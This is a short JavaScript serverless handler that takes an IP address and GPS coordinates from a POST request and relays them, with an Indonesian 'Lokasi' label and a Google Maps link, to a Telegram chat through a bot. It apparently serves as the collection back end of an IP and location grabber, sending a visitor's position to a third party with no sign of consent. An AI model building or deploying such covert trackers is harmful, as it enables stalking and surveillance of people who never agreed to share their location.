export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).send("Method not allowed");
  }

  const { ip, latitude, longitude } = req.body;

  const TELEGRAM_BOT_TOKEN = process.env.BOT_TOKEN;
  const CHAT_ID = process.env.CHAT_ID;

  const text = `
IP: ${ip || "-"}

Lokasi:
Lat: ${latitude || "-"}
Long: ${longitude || "-"}

Maps:
https://maps.google.com/?q=${latitude},${longitude}
`;

  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text
    })
  });

  res.status(200).json({ success: true });
}
